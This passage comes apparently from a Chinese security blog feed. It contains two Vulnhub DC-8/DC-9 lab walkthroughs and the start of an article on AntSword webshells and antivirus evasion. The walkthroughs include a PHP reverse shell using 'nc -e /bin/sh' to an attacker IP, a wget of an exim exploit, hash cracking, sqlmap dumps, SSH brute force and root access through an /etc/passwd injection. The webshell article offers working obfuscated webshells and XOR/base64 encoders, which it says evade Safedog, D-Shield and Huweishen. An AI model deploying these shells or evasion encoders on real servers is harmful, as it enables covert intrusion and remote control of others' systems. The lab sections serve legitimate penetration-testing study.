&#39;1567489015&#39;[05:16:06] [INFO] resumed: &#39;dc8blah@dc8blah.org&#39;[05:16:06] [INFO] resumed: &#39;1567766626&#39;[05:16:06] [INFO] resumed: &#39;dcau-user@outlook.com&#39;[05:16:06] [INFO] resumed: &#39;$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z&#39;[05:16:06] [INFO] resumed: &#39;0&#39;[05:16:06] [INFO] resumed: &#39;&#39;[05:16:06] [INFO] resumed: &#39;filtered_html&#39;[05:16:06] [INFO] resumed: &#39;1&#39;[05:16:06] [INFO] resumed: &#39;&#39;[05:16:06] [INFO] resumed: &#39;Australia/Brisbane&#39;[05:16:06] [INFO] resumed: &#39;1&#39;[05:16:06] [INFO] resumed: &#39;1567498512&#39;[05:16:06] [INFO] resumed: &#39;a:5:{s:16:&quot;ckeditor_default&quot;;s:1:&quot;t&quot;;s:20:&quot;ckeditor_show_toggle&quot;;s:1:&quot;t&quot;;s:14:&quot;ckeditor_width&quot;;s:4:...[05:16:06] [INFO] resumed: &#39;&#39;[05:16:06] [INFO] resumed: &#39;john&#39;[05:16:06] [INFO] resumed: &#39;1567489250&#39;[05:16:06] [INFO] resumed: &#39;john@blahsdfsfd.org&#39;[05:16:06] [INFO] resumed: &#39;1567497783&#39;[05:16:06] [INFO] resumed: &#39;john@blahsdfsfd.org&#39;[05:16:06] [INFO] resumed: &#39;$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF&#39;[05:16:06] [INFO] resumed: &#39;0&#39;[05:16:06] [INFO] resumed: &#39;&#39;</code></pre><p>爆破一下hash值,使用john这里提示了<br>爆破成功了john的密码turtle</p><pre><code>C:\root\Desktop&gt; john pass.txt Using default input encoding: UTF-8Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])No password hashes left to crack (see FAQ)C:\root\Desktop&gt; john --show pass.txtjohn:turtle1 password hash cracked, 0 left</code></pre><p>扫描一下目录</p><pre><code>dirb http://192.168.124.152</code></pre><p>发现user目录是登录的地方</p><p>登录成功,发现这个位置可以添加php代码，直接尝试反弹shell</p><pre><code>http://192.168.124.152/node/3#overlay=node/3/webform/configure</code></pre><pre><code>&lt;p&gt;flag&lt;/p&gt;&lt;?phpsystem(&quot;nc -e /bin/sh 192.168.124.139  4444&quot;);?&gt;</code></pre><p>然后这个页面随便输出什么点击提交等待反弹的shell<br><img src="/images/pasted-273.png" alt="upload successful"><br>然后反弹交互shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><h3 id="提权-3"><a href="#提权-3" class="headerlink" title="提权"></a>提权</h3><p>先尝试suid提权</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><pre><code>www-data@dc-8:/var/www/html$ find / -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null/usr/bin/chfn/usr/bin/gpasswd/usr/bin/chsh/usr/bin/passwd/usr/bin/sudo/usr/bin/newgrp/usr/sbin/exim4/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/bin/ping/bin/su/bin/umount/bin/mount</code></pre><p><img src="/images/pasted-274.png" alt="upload successful"><br>发现一个特别的exim4搜索一下漏洞<br>尝试一下这个漏洞<br><img src="/images/pasted-275.png" alt="upload successful"><br>先复制出来</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh</code></pre><p>处理为unix可以的</p><p><img src="/images/pasted-278.png" alt="upload successful"><br><img src="/images/pasted-277.png" alt="upload successful"><br>开启一个服务或者你蚁剑连接上传</p><pre><code>python -m SimpleHTTPServer</code></pre><p>然后下载下来</p><pre><code>wget http://192.168.124.139:8000/46996.sh</code></pre><p>里面有使用说明<br><img src="/images/pasted-276.png" alt="upload successful"></p><pre><code>chmod 777 46996.sh./46996.sh -m netcat</code></pre><p><img src="/images/pasted-279.png" alt="upload successful"></p><pre><code>Brilliant - you have succeeded!!!888       888          888 888      8888888b.                             888 888 888 888888   o   888          888 888      888  &quot;Y88b                            888 888 888 888888  d8b  888          888 888      888    888                            888 888 888 888888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 88888888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and all those who have taken the time to complete these littlechallenges.I&#39;m also sending out an especially big thanks to:@4nqr34z@D4mianWayne@0xmzfr@theart42This challenge was largely based on two things:1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.2. A suggestion from @theart42The answer to that question is...If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h3 id="参考文章-6"><a href="#参考文章-6" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/weixin_43583637/article/details/102828013" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43583637/article/details/102828013</a><br><a href="https://fan497.top/2020/11/17/vulnhub-DC8/" target="_blank" rel="noopener">https://fan497.top/2020/11/17/vulnhub-DC8/</a></p><h2 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h2><h3 id="基本环境搭建-4"><a href="#基本环境搭建-4" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-9.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-9.zip</a></p><h3 id="基本信息收集-7"><a href="#基本信息收集-7" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.153Host is up (0.00041s latency).Not shown: 998 closed portsPORT   STATE    SERVICE VERSION22/tcp filtered ssh80/tcp open     http    Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Example.com - Staff Details - WelcomeMAC Address: 00:0C:29:20:FE:11 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.41 ms 192.168.124.153</code></pre><p>开放了80，22ssh，操作系统linux</p><p>端口的进一步扫描(没发现新的端口)</p><pre><code>nmap 192.168.124.153 -p 1-65535</code></pre><p>爆破一下ssh</p><pre><code>nmap --script=ssh-brute 192.168.124.153</code></pre><p>查看80端口，说让我们看看你其他目录</p><p><img src="/images/pasted-280.png" alt="upload successful"><br>测试了一下manage功能似乎没有啥问题，再search的地方发现了sql注入<br><img src="/images/pasted-281.png" alt="upload successful"><br>sqlmap直接跑一下,跑出三个数据库</p><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; --dbs</code></pre><p><img src="/images/pasted-282.png" alt="upload successful"><br>继续跑表</p><h4 id="users的"><a href="#users的" class="headerlink" title="users的"></a>users的</h4><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D users --tables</code></pre><p><img src="/images/pasted-283.png" alt="upload successful"></p><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D users -T UserDetails --dump</code></pre><pre><code>+------+------------+---------------------+-----------+-----------+---------------+| id   | lastname   | reg_date            | username  | firstname | password      |+------+------------+---------------------+-----------+-----------+---------------+| 17   | Morrison   | 2019-12-29 16:58:28 | janitor2  | Scott     | Hawaii-Five-0 || 16   | Trump      | 2019-12-29 16:58:26 | janitor   | Donald    | Ilovepeepee   || 15   | McScoots   | 2019-12-29 16:58:26 | scoots    | Scooter   | YR3BVxxxw87   || 14   | Buffay     | 2019-12-29 16:58:26 | phoebeb   | Phoebe    | smellycats    || 13   | Geller     | 2019-12-29 16:58:26 | monicag   | Monica    | 3248dsds7s    || 12   | Geller     | 2019-12-29 16:58:26 | rossg     | Ross      | ILoveRachel   || 11   | Green      | 2019-12-29 16:58:26 | rachelg   | Rachel    | yN72#dsd      || 10   | Tribbiani  | 2019-12-29 16:58:26 | joeyt     | Joey      | Passw0rd      || 9    | Bing       | 2019-12-29 16:58:26 | chandlerb | Chandler  | UrAG0D!       || 8    | Rubble     | 2019-12-29 16:58:26 | bettyr    | Betty     | BamBam01      || 7    | Flintstone | 2019-12-29 16:58:26 | wilmaf    | Wilma     | Pebbles       || 6    | Mouse      | 2019-12-29 16:58:26 | jerrym    | Jerry     | B8m#48sd      || 5    | Cat        | 2019-12-29 16:58:26 | tomc      | Tom       | TC&amp;TheBoyz    || 4    | Rubble     | 2019-12-29 16:58:26 | barneyr   | Barney    | RocksOff      || 3    | Flintstone | 2019-12-29 16:58:26 | fredf     | Fred      | 4sfd87sfd1    || 2    | Dooley     | 2019-12-29 16:58:26 | julied    | Julie     | 468sfdfsd2    || 1    | Moe        | 2019-12-29 16:58:26 | marym     | Mary      | 3kfs86sfd     </code></pre><p><img src="/images/pasted-284.png" alt="upload successful"></p><h4 id="Staff的"><a href="#Staff的" class="headerlink" title="Staff的"></a>Staff的</h4><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D Staff --tables</code></pre><p>报出了俩表</p><pre><code>Database: Staff[2 tables]+--------------+| StaffDetails || Users        |+--------------+</code></pre><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D Staff -T Users --dump</code></pre><p>Users的表</p><pre><code>Database: StaffTable: Users[1 entry]+--------+----------+----------------------------------+| UserID | Username | Password                         |+--------+----------+----------------------------------+| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |+--------+----------+----------------------------------+</code></pre><p>StaffDetails的表</p><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D Staff -T StaffDetails --dump</code></pre><pre><code>Database: StaffTable: StaffDetails[17 entries]+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+| id   | email                 | phone          | lastname   | reg_date            | firstname | position                      |+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+| 2    | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               || 17   | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor || 15   | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  || 13   | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     || 11   | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            || 9    | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             || 7    | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      || 5    | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        || 3    | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         || 1    | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           || 16   | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           || 14   | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             || 12   | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    || 10   | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       || 8    | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               || 6    | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        || 4    | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+</code></pre><p>MD5解码一下password的密码</p><pre><code>856f5de590ef37314e7c3bdf6f8a66dc</code></pre><p><img src="/images/pasted-285.png" alt="upload successful"><br>密码</p><pre><code>transorbital1</code></pre><p>尝试登录,登录成功，发现这里提示File does not exist，估计是包含了某个文件，尝试文件包含,发现确实存在文件包含<br><img src="/images/pasted-286.png" alt="upload successful"><br><img src="/images/pasted-287.png" alt="upload successful"><br>然后看来大佬的wp，发现一个没了解的地方</p><pre><code>http://192.168.124.153/welcome.php?file=../../../../../../../../../etc/knockd.conf</code></pre><p><img src="/images/pasted-288.png" alt="upload successful"><br><img src="/images/pasted-289.png" alt="upload successful"><br>也就是说黑客进行直接扫描端口扫描不出来，只有进行固定knockd的访问才能打开<br>查看配置文件发现需要连续访问的端口</p><pre><code>[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn </code></pre><p>轮流敲</p><pre><code>nmap 192.168.124.153 -p 7469nmap 192.168.124.153 -p 8475nmap 192.168.124.153 -p 9842</code></pre><p><img src="/images/pasted-290.png" alt="upload successful"><br>将之前爆破的users的账号密码，提权出来进行ssh的爆破</p><pre><code>cat UserDetails.csv | awk -F &#39;,&#39; &#39;{print $4}&#39; &gt; username.txt</code></pre><p><img src="/images/pasted-291.png" alt="upload successful"></p><pre><code>cat UserDetails.csv | awk -F &#39;,&#39; &#39;{print $NF}&#39; &gt; password.txt</code></pre><p><img src="/images/pasted-292.png" alt="upload successful"></p><h4 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h4><p>hydra破解进行破解</p><pre><code>hydra -L username.txt -P password.txt 192.168.124.153 ssh</code></pre><p>成功爆破出三个用户<br><img src="/images/pasted-293.png" alt="upload successful"><br>登录janitor发现了隐藏文件<br><img src="/images/pasted-294.png" alt="upload successful"><br>将其加入到password中再次进行爆破<br>成功多爆破出一个账号密码尝试登录</p><p><img src="/images/pasted-295.png" alt="upload successful"><br>看一下权限</p><pre><code>sudo -l</code></pre><p><img src="/images/pasted-296.png" alt="upload successful"><br>发现一个test文件<br><img src="/images/pasted-297.png" alt="upload successful"><br>执行了一下发现执行不了<br>再上一层目录发现了源码<br>代码的意思是将第一个文件的内容写入第二个文件中<br>所以我们可以创建一个文件写入root权限的信息，然后用test将其写入到/etc/passwd中</p><pre><code>echo &quot;admin:*:0:0:::/bin/bash&quot; &gt;&gt; /tmp/passwd</code></pre><p><img src="/images/pasted-298.png" alt="upload successful"><br>然后利用test将/tmp/passwd的内容写入到/etc/passwd中</p><pre><code>sudo ./test /tmp/passwd /etc/passwd</code></pre><pre><code>fredf@dc-9:/opt/devstuff/dist/test$ su adminroot@dc-9:/opt/devstuff/dist/test# whoamirootroot@dc-9:~# lstheflag.txtroot@dc-9:~# cat theflag.txt ███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝Congratulations - you have done well to get to this point.Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all thosewho have taken the time to complete the various DC challenges.I also want to send out a big thank you to the various members of @m0tl3ycr3w .They are an inspirational bunch of fellows.Sure, they might smell a bit, but...just kidding.  :-)Sadly, all things must come to an end, and this will be the last everchallenge in the DC series.So long, and thanks for all the fish.</code></pre><h3 id="参考文章-7"><a href="#参考文章-7" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/yurang/p/13709536.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/13709536.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;DC1&quot;&gt;&lt;a href=&quot;#DC1&quot; class=&quot;headerlink&quot; title=&quot;DC1&quot;&gt;&lt;/a&gt;DC1&lt;/h2&gt;&lt;h3 id=&quot;文章前提概述&quot;&gt;&lt;a href=&quot;#文章前提概述&quot; class=&quot;headerlink&quot; title=&quot;文章前提概述&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="靶场" scheme="https://lnng.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
      <category term="DC" scheme="https://lnng.top/tags/DC/"/>
    
  </entry>
  
  <entry>
    <title>蚁剑原理与魔改</title>
    <link href="https://lnng.top/posts/8e46.html"/>
    <id>https://lnng.top/posts/8e46.html</id>
    <published>2020-11-21T01:59:00.000Z</published>
    <updated>2021-05-30T14:39:19.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一句话木马原理"><a href="#一句话木马原理" class="headerlink" title="一句话木马原理"></a>一句话木马原理</h2><p>一句话木马形如这样：</p><pre><code>&lt;?php @eval($_POST[password]);?&gt;</code></pre><p>使用蚁剑连接，连接成功<br><img src="/images/pasted-216.png" alt="upload successful"><br>那为什么能成功呢？<br>首先要探寻一句话木马的原理<br><img src="/images/pasted-217.png" alt="upload successful"><br>所以我们post传入的字符串会以php代码的形式运行，而php代码又能调用系统操作所以便成了木马<br><img src="/images/pasted-218.png" alt="upload successful"></p><h2 id="蚁剑的原理"><a href="#蚁剑的原理" class="headerlink" title="蚁剑的原理"></a>蚁剑的原理</h2><p>知道了一句话木马的原理，那么我们康康蚁剑的原理，蚁剑用很多功能确实很方便。还支持编码，垃圾数值，随机数，自定义编码解码器。<br><img src="/images/pasted-219.png" alt="upload successful"><br>首先选择代理设置，因为这里我们选择用burpsuite来抓取流量，<br><img src="/images/pasted-220.png" alt="upload successful"><br><img src="/images/pasted-221.png" alt="upload successful"><br><img src="/images/pasted-222.png" alt="upload successful"><br>蚁剑连接来分析一下流量</p><pre><code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out){    return $out;};function asoutput(){$output=ob_get_contents(); //返回输出缓冲区的内容ob_end_clean(); //清理(擦除)缓冲区并关闭输出缓冲echo &quot;c6b05fd97&quot;;echo @asenc($output);echo &quot;d69e35d304&quot;;}ob_start(); //打开输出缓冲区try{$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); //获取当前url路由的绝对路径if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]); //当前脚本所在文件系统（非文档根目录）的基本路径$R=&quot;{$D}    &quot;;if(substr($D,0,1)!=&quot;/&quot;){foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;{$L}:&quot;))$R.=&quot;{$L}:&quot;;}else{$R.=&quot;/&quot;;}$R.=&quot;    &quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;    {$s}&quot;;echo $R;;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die(); //获取目录，uid，系统信息，用户等信息</code></pre><p>然后我们就大概了解了一下蚁剑的功能，在康康蚁剑是如何获取数据的<br><img src="/images/pasted-223.png" alt="upload successful"></p><pre><code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);            //不显示报错function asenc($out){return $out;};                               //用于返回信息function asoutput(){$output=ob_get_contents();ob_end_clean();echo &quot;a170af01bc&quot;;            //用于返回信息，同时加入岁间前缀，对安全狗是一种绕过echo @asenc($output);echo &quot;6d341a3c3a&quot;;}ob_start();                    try{$F=base64_decode(substr($_POST[&quot;hfdce8c1b4e4ef&quot;],2));      //base64解码post传入的另一个数据$P=@fopen($F,&quot;r&quot;);                                        // 进行读取文件的操作echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();   //报错信息</code></pre><p>原理还是很好理解的，但是不明白为什么要令外post一个数据再进去文件内的传递，难道是面对对象编写的原因，还是令有好处，但是如果整体个人觉得更容易混淆流量，不过问题不大，后面还要编码更多的参数，才能绕过安全🐕</p><h2 id="编码器原理"><a href="#编码器原理" class="headerlink" title="编码器原理"></a>编码器原理</h2><p>蚁剑自带变量，支持我们自定义编码和加密方式来混淆传入的主变量(不知道叫啥名字就就是连接密码的那个变量)的参数<br><img src="/images/pasted-225.png" alt="upload successful"></p><pre><code>/** * php::base64编码器 * Create at: 2020/11/21 15:21:10 */&#39;use strict&#39;;/** @param  {String} pwd   连接密码* @param  {Array}  data  编码器处理前的 payload 数组* @return {Array}  data  编码器处理后的 payload 数组*/module.exports = (pwd, data, ext={}) =&gt; {  // ##########    请在下方编写你自己的代码   ###################  // 以下代码为 PHP Base64 样例  // 生成一个随机变量名  let randomID = `_0x${Math.random().toString(16).substr(2)}`;  // 原有的 payload 在 data[&#39;_&#39;]中  // 取出来之后，转为 base64 编码并放入 randomID key 下  data[randomID] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，  data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;  // ##########    请在上方编写你自己的代码   ###################  // 删除 _ 原有的payload  delete data[&#39;_&#39;];  // 返回编码器处理后的 payload 数组  return data;}</code></pre><p>代码作者已经给了注释很好理解，然后我们就可以开心的构造自己的编码方式来绕过安全狗了。</p><h2 id="免杀小例子"><a href="#免杀小例子" class="headerlink" title="免杀小例子"></a>免杀小例子</h2><p>这里给了例子吧。直接使用双层base64，我丢尽然还能免杀(后来测试发现)，学长聊天说双base64能过🐕，我起初不信，尝试了一下，发现不行。写这篇文章的时候尝试一下还是不行，然后发现是因为我的webshell没有做免杀处理，被🐕直接给扫出来，然后就不管你的流量了直接杀，wogiao！牛皮！！<br>双base64蚁剑编码器</p><pre><code>/** * php::base64编码器 * Create at: 2020/11/21 15:21:10 */&#39;use strict&#39;;/** @param  {String} pwd   连接密码* @param  {Array}  data  编码器处理前的 payload 数组* @return {Array}  data  编码器处理后的 payload 数组*/module.exports = (pwd, data, ext={}) =&gt; {  // ##########    请在下方编写你自己的代码   ###################  // 以下代码为 PHP Base64 样例  // 生成一个随机变量名  let randomID = `_0x${Math.random().toString(16).substr(2)}`;  // 原有的 payload 在 data[&#39;_&#39;]中  // 取出来之后，转为 base64 编码并放入 randomID key 下  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，  //data[pwd] = `${data[&#39;_&#39;]}&quot;));`;  data[pwd] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);  // ##########    请在上方编写你自己的代码   ###################  // 删除 _ 原有的payload  delete data[&#39;_&#39;];  // 返回编码器处理后的 payload 数组  return data;}</code></pre><p>免杀的webshell</p><pre><code>&lt;?php header(&#39;HTTP/1.1 404&#39;);class COMI {     public $c=&#39;&#39;;    function __destruct() {        return eval(substr($this-&gt;c, 0));    }}$comi = new COMI();$password = &amp;$password1;$password1 = $_REQUEST[&#39;password&#39;];$post = &amp;$password;$post=base64_decode(base64_decode($post));$lnng1 = &amp;$lnng;$lnng = $post;$lnng2 = $lnng1;@$comi-&gt;c = substr($lnng2, 0);?&gt;</code></pre><p>webshell是能够免杀安全🐕和D盾和护卫神的，其他的没测试<br><img src="/images/pasted-227.png" alt="upload successful"><br><img src="/images/pasted-226.png" alt="upload successful"></p><h2 id="xor-random-base64免杀"><a href="#xor-random-base64免杀" class="headerlink" title="xor_random_base64免杀"></a>xor_random_base64免杀</h2><p>编码器:</p><pre><code>/** * php::base64编码器 * Create at: 2020/11/19 21:20:31 *lnng.top */&#39;use strict&#39;;module.exports = (pwd, data, ext = {}) =&gt; {  let randomID = `x${Math.random().toString(16).substr(2)}`;  function xor(payload) {    let crypto = require(&#39;crypto&#39;);    let key = crypto.createHash(&#39;md5&#39;).update(randomID).digest(&#39;hex&#39;).substr(6);    ext.opts.httpConf.headers[&#39;Cookie&#39;] = &#39;PHPSESSID=&#39; + key;    key = key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0));    //let payload=&quot;phpinfo();&quot;;    let cipher = payload.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0));    for (let i = 0; i &lt; cipher.length; i++) {      cipher[i] = cipher[i] ^ key[i % 26]    }    cipher = cipher.map(t =&gt; String.fromCharCode(t)).join(&quot;&quot;)    cipher = Buffer.from(cipher).toString(&#39;base64&#39;);    //console.log(cipher)    return cipher;  }  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);  // 生成一个随机变量名  let num =  Math.floor(Math.random()*15);  let randomStr = `${Math.random().toString(16).substr(num)}`;  //data[&#39;password&#39;] = 15-num;  //data[pwd] = `eval(base64_decode(&quot;${data[&#39;_&#39;]}&quot;));`;  //data[pwd]=xor(data[pwd]);  //data[pwd] = `${randomStr}` + data[pwd] + `${randomStr}`;  let ret = {};  for (let _ in data) {    if (_ === &#39;_&#39;) { continue };    //if (_ === &#39;num&#39;) { continue };    //if (_ === &#39;password&#39;) { continue };    ret[_] = Buffer.from(data[_]).toString(&#39;hex&#39;);    //ret[_] = Buffer.from(data[_]);  }  //ret[password] = data[&#39;password&#39;].toString(&#39;hex&#39;);  ret[&#39;password&#39;] = 15-num;  ret[pwd] = `eval(base64_decode(&quot;${data[&#39;_&#39;]}&quot;));`;  ret[pwd] = xor(ret[pwd]);  ret[pwd] = `${randomStr}` + ret[pwd] + `${randomStr}`  //ret[pwd] = ret[pwd].toString(&#39;hex&#39;);  return ret;  //删除原有payload  //delete data[&#39;_&#39;]; //返回编码器处理后的payload数组  //return data;}</code></pre><p>免杀的webshell(密码username)</p><pre><code>&lt;?phpheader(&#39;HTTP/1.1 404&#39;);class Cookie{    function __construct(){        $password = &amp;$password1;        $password1 = $_REQUEST[&#39;password&#39;];        $num = &amp;$password;        $num = $_REQUEST[&#39;password&#39;];        if(is_numeric($num)){        $post=base64_decode(substr(@$_REQUEST[&#39;username&#39;],$num,-$num));        }        return $post;    }    function decode(){        $key=$_COOKIE[&#39;PHPSESSID&#39;];        $post = $this-&gt;__construct();        for($i=0;$i&lt;strlen($post);$i++){            $k = $i%26;            $s = $post[$i];            $post[$i] = $s ^ $key[$k];          }        return $post;    }    function __destruct(){        foreach($_POST as $k =&gt; $v){            if ($k!=&#39;password&#39;&amp;&amp;$k!=&#39;username&#39;) {                $b = &amp;$a;                $a = $v;                $c = &amp;$b;                $_POST[$k]=hex2bin($c);            }        }        $a = (&#39;!&#39;^&#39;@&#39;).&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;        $lnng1 = &amp;$lnng;        $lnng = $this-&gt;decode();        $lnng2 = $lnng1;        return @$a(`/**123**/`.$lnng2.`/**123**/`);    }}$check=new Cookie();?&gt;</code></pre><p><img src="/images/pasted-431.png" alt="upload successful"></p><h2 id="反序列化免杀-这里和蚁剑没关系"><a href="#反序列化免杀-这里和蚁剑没关系" class="headerlink" title="反序列化免杀(这里和蚁剑没关系)"></a>反序列化免杀(这里和蚁剑没关系)</h2><p>写的非常简单，自己只是测试着玩，可以写的更加完善，主要是思路<br>接近有漏洞的代码就可以免杀(个人理解,请大佬指教)<br>客户端webshell</p><pre><code>&lt;?phpclass Lnng{    var $lnng;    function __destruct(){        $a = (&#39;!&#39;^&#39;@&#39;).&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;        @$a($this-&gt;lnng);    }}$lnng = unserialize($_POST[&#39;lnng&#39;]);?&gt;</code></pre><p>服务端自己写了一个php页面非常的简陋，菜哭了我</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;php序列化webshell&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;    &lt;p&gt;请输出url,例如http://192.168.124.141/12.php&lt;/p&gt;     &lt;input type=&quot;text&quot; name=&quot;ip&quot; style=&quot;width:400px; height:30px;&quot; value=&quot;&lt;?php if(isset($_POST[&#39;ip&#39;])){echo $_POST[&#39;ip&#39;];}?&gt;&quot; /&gt;     &lt;br&gt;     &lt;p&gt;请输出命令,内部命令执行方式assert(你输入的值)&lt;/p&gt;     &lt;input type=&quot;text&quot; name=&quot;command&quot; style=&quot;width:400px; height:30px;&quot; value=&quot;&lt;?php 